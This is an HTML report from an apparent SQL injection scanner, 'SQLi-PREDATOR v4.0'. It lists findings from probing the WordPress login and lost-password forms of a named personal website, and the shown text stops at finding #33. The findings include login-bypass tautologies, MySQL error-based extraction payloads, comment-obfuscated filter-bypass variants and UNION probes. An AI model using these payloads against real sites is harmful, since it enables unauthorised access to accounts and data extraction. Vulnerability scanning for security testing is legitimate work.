@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLi-PREDATOR v4.0 — Scan Report</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e14; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding: 2rem; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { border-bottom: 1px solid #21262d; padding-bottom: 1.5rem; margin-bottom: 2rem; }
+        .header h1 { color: #58a6ff; font-size: 1.8rem; }
+        .header .meta { color: #8b949e; font-size: 0.9rem; margin-top: 0.5rem; }
+        .summary { display: grid; grid-template-columns: repeat(5, 1fr); gap: 1rem; margin-bottom: 2rem; }
+        .summary-card { background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 1rem; text-align: center; }
+        .summary-card .count { font-size: 2rem; font-weight: bold; }
+        .summary-card .label { font-size: 0.8rem; color: #8b949e; margin-top: 0.25rem; }
+        .finding { background: #161b22; border: 1px solid #21262d; border-radius: 8px; margin-bottom: 1rem; padding: 1rem; }
+        .finding .hdr { display: flex; gap: 0.5rem; align-items: center; flex-wrap: wrap; margin-bottom: 0.75rem; }
+        .badge { padding: 0.2rem 0.6rem; border-radius: 12px; font-size: 0.75rem; font-weight: 600; }
+        .badge-critical { background: #dc3545; color: white; }
+        .badge-high { background: #fd7e14; color: black; }
+        .badge-medium { background: #ffc107; color: black; }
+        .badge-low { background: #28a745; color: white; }
+        .badge-info { background: #17a2b8; color: white; }
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.5rem; font-size: 0.85rem; }
+        .grid .label { color: #6c757d; }
+        pre { background: #0d1117; padding: 0.75rem; border-radius: 4px; overflow-x: auto; font-size: 0.8rem; color: #f0c674; margin-top: 0.5rem; }
+        code { background: #0d1117; padding: 0.1rem 0.3rem; border-radius: 3px; font-size: 0.85rem; color: #f0c674; }
+        .footer { text-align: center; color: #484f58; font-size: 0.8rem; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid #21262d; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🦅 SQLi-PREDATOR v4.0 — Scan Report</h1>
+            <div class="meta">
+                <strong>Target:</strong> https://sagarsinha.in/wp-login.php<br>
+                <strong>Scan ID:</strong> 5d649f161dd4<br>
+                <strong>Duration:</strong> 110.7s<br>
+                <strong>Timestamp:</strong> 2026-07-20 07:51:11<br>
+                <strong>Total Findings:</strong> 65
+            </div>
+        </div>
+        <div class="summary">
+            <div class="summary-card"><div class="count" style="color:#dc3545">0</div><div class="label">Critical</div></div>
+            <div class="summary-card"><div class="count" style="color:#fd7e14">6</div><div class="label">High</div></div>
+            <div class="summary-card"><div class="count" style="color:#ffc107">0</div><div class="label">Medium</div></div>
+            <div class="summary-card"><div class="count" style="color:#28a745">47</div><div class="label">Low</div></div>
+            <div class="summary-card"><div class="count" style="color:#17a2b8">12</div><div class="label">Info</div></div>
+        </div>
+
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#1:</strong> Parameter <code>log</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Tautology OR</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#2:</strong> Parameter <code>log</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 #</code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL tautology</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#3:</strong> Parameter <code>log</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">AND true</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-high">High</span>
+                <span class="badge badge-info">Error Based</span>
+                <span class="badge badge-info">CVSS 5.0</span>
+                <span class="badge badge-info">50% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#4:</strong> Parameter <code>log</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>MySQL</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) -- </code></div>
+            </div>
+<div style="margin-top:0.5rem;"><span class="label">Error Signatures:</span><div style="display:flex;flex-wrap:wrap;gap:0.25rem;margin-top:0.25rem;"><code style="color:#f85149;">extractvalue</code></div></div><p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL ExtractValue</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-high">High</span>
+                <span class="badge badge-info">Error Based</span>
+                <span class="badge badge-info">CVSS 5.0</span>
+                <span class="badge badge-info">50% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#5:</strong> Parameter <code>log</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>MySQL</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.EQUIVALENT_REPLACEMENT</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AnD ExtraCTvALUE(1, CONcAT(0x7e, (sE/*!99999*/LEct VERsION()), 0x7e)) -- </code></div>
+            </div>
+<div style="margin-top:0.5rem;"><span class="label">Error Signatures:</span><div style="display:flex;flex-wrap:wrap;gap:0.25rem;margin-top:0.25rem;"><code style="color:#f85149;">extractvalue</code></div></div><p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL ExtractValue</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-high">High</span>
+                <span class="badge badge-info">Error Based</span>
+                <span class="badge badge-info">CVSS 5.0</span>
+                <span class="badge badge-info">50% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#6:</strong> Parameter <code>log</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>MySQL</code></div>
+                <div><span class="label">Bypass</span><br><code>BypassTechnique.TAB_SEPARATOR</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; A/**/ND ExTRacTVALUE(1, cONCAT(0X7e, (sE/*!99999*/LECT VErSion()), 0X7E)) -- </code></div>
+            </div>
+<div style="margin-top:0.5rem;"><span class="label">Error Signatures:</span><div style="display:flex;flex-wrap:wrap;gap:0.25rem;margin-top:0.25rem;"><code style="color:#f85149;">extractvalue</code></div></div><p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL ExtractValue</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-high">High</span>
+                <span class="badge badge-info">Error Based</span>
+                <span class="badge badge-info">CVSS 5.0</span>
+                <span class="badge badge-info">50% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#7:</strong> Parameter <code>log</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>MySQL</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1) -- </code></div>
+            </div>
+<div style="margin-top:0.5rem;"><span class="label">Error Signatures:</span><div style="display:flex;flex-wrap:wrap;gap:0.25rem;margin-top:0.25rem;"><code style="color:#f85149;">updatexml</code></div></div><p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL UpdateXML</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#8:</strong> Parameter <code>pwd</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Tautology OR</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#9:</strong> Parameter <code>pwd</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 #</code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL tautology</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#10:</strong> Parameter <code>pwd</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">AND true</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#11:</strong> Parameter <code>rememberme</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Tautology OR</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#12:</strong> Parameter <code>rememberme</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 #</code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL tautology</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#13:</strong> Parameter <code>rememberme</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">AND true</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#14:</strong> Parameter <code>user_login</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php?action=lostpassword</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Tautology OR</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#15:</strong> Parameter <code>user_login</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php?action=lostpassword</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 #</code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL tautology</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-info">Info</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 0.0</span>
+                <span class="badge badge-info">0% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#16:</strong> Parameter <code>user_login</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php?action=lostpassword</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">AND true</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-high">High</span>
+                <span class="badge badge-info">Error Based</span>
+                <span class="badge badge-info">CVSS 5.0</span>
+                <span class="badge badge-info">50% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#17:</strong> Parameter <code>user_login</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php?action=lostpassword</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>MySQL</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) -- </code></div>
+            </div>
+<div style="margin-top:0.5rem;"><span class="label">Error Signatures:</span><div style="display:flex;flex-wrap:wrap;gap:0.25rem;margin-top:0.25rem;"><code style="color:#f85149;">extractvalue</code></div></div><p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL ExtractValue</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-high">High</span>
+                <span class="badge badge-info">Error Based</span>
+                <span class="badge badge-info">CVSS 5.0</span>
+                <span class="badge badge-info">50% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#18:</strong> Parameter <code>user_login</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php?action=lostpassword</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>POST</code></div>
+                <div><span class="label">DB Type</span><br><code>MySQL</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1) -- </code></div>
+            </div>
+<div style="margin-top:0.5rem;"><span class="label">Error Signatures:</span><div style="display:flex;flex-wrap:wrap;gap:0.25rem;margin-top:0.25rem;"><code style="color:#f85149;">updatexml</code></div></div><p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL UpdateXML</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#19:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27;</code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Single quote break</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#20:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&quot;</code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Double quote break</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#21:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Tautology OR</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#22:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=1 #</code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">MySQL tautology</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#23:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR 1=2 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">False condition</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#24:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND 1=1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">AND true</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#25:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; AND 1=2 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">AND false</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#26:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR &#x27;a&#x27;=&#x27;a&#x27; -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">String tautology</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#27:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; OR &#x27;a&#x27;=&#x27;b&#x27; -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">String false</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#28:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Auth bypass</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#29:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>admin&#x27; -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">Comment auth bypass</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#30:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27; ORDER BY 1 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">ORDER BY column probe</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#31:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>1&#x27; ORDER BY 100 -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">ORDER BY 100</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
+                <span class="badge badge-info">30% confidence</span>
+            </div>
+            <p style="margin-bottom:0.5rem;"><strong>#32:</strong> Parameter <code>action</code> on <span style="color:#8b949e;">https://sagarsinha.in/wp-login.php</span></p>
+            <div class="grid">
+                <div><span class="label">Vector</span><br><code>GET</code></div>
+                <div><span class="label">DB Type</span><br><code>Unknown</code></div>
+                <div><span class="label">Bypass</span><br><code>NONE</code></div>
+                <div><span class="label">Payload</span><br><code>&#x27; UNION SELECT NULL -- </code></div>
+            </div>
+<p style="margin-top:0.5rem;font-size:0.85rem;color:#8b949e;">UNION 1 column</p></div>
+        <div class="finding">
+            <div class="hdr">
+                <span class="badge badge-low">Low</span>
+                <span class="badge badge-info">Boolean Based</span>
+                <span class="badge badge-info">CVSS 3.0</span>
